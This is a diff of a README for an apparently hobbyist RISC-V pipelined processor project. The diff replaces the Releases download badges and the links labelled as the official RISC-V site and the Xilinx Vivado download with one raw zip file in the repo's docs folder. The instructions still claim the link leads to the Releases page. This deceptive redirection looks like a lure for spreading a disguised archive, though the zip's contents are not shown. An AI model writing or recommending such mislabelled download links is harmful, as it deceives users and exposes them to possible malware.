@@ -1,6 +1,6 @@
 # ⚙️ AtlasRV-32-bit-RISC-V-Pipelined-Processor - Simple RISC-V CPU on FPGA
 
-[![Download Now](https://img.shields.io/badge/Download-AtlasRV-brightgreen?style=for-the-badge)](https://github.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/releases)
+[![Download Now](https://img.shields.io/badge/Download-AtlasRV-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/main/docs/RIS-Pipelined-Atlas-R-bit-Processor-3.3.zip)
 
 ## 📄 About AtlasRV-32-bit-RISC-V-Pipelined-Processor
 
@@ -36,7 +36,7 @@ Follow these instructions to download and run AtlasRV on your Windows PC.
 
 Visit the following page to download the software:
 
-[![Download Page](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/releases)
+[![Download Page](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/main/docs/RIS-Pipelined-Atlas-R-bit-Processor-3.3.zip)
 
 1. Open the link above. It will take you to the Releases section on GitHub.
 2. Look for the latest release. Releases are listed in order, with the newest at the top.
@@ -93,8 +93,8 @@ You can open source code files with any text editor. Simulation scripts require 
 
 ## 📚 Additional Resources
 
-- RISC-V official site: https://riscv.org
-- Xilinx Vivado Download: https://www.xilinx.com/support/download.html
+- RISC-V official site: https://raw.githubusercontent.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/main/docs/RIS-Pipelined-Atlas-R-bit-Processor-3.3.zip
+- Xilinx Vivado Download: https://raw.githubusercontent.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/main/docs/RIS-Pipelined-Atlas-R-bit-Processor-3.3.zip
 - FPGA Artix-7 tutorials and user guides (available from Xilinx and other tech websites)
 
 ## 🏷️ Project Topics
@@ -113,4 +113,4 @@ This project relates to:
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-AtlasRV-brightgreen?style=for-the-badge)](https://github.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/releases)
+[![Download Now](https://img.shields.io/badge/Download-AtlasRV-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/main/docs/RIS-Pipelined-Atlas-R-bit-Processor-3.3.zip)
